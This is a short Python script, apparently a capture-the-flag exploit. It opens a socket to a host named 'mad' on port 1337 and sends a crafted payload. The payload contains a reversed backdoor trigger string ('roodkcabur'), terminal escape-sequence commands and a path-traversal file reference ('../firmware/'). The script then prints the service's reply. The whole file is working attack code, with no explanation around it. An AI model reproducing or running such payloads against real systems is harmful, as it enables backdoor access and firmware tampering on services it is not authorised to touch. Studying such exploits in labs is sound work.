import socket
import hashlib
import sys

hash = hashlib.md5(sys.argv[1].encode()).hexdigest()[:0x10]
command = f"scroll!!roodkcabur!\n\x1bfu{hash}\n{sys.argv[1]}\n\x1bpr../firmware/{hash}\n".encode()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("mad", 1337))
sock.sendall(command)

for r in iter(lambda: sock.recv(512), b''):
    print(r.decode(errors="ignore"), end="")

sock.close()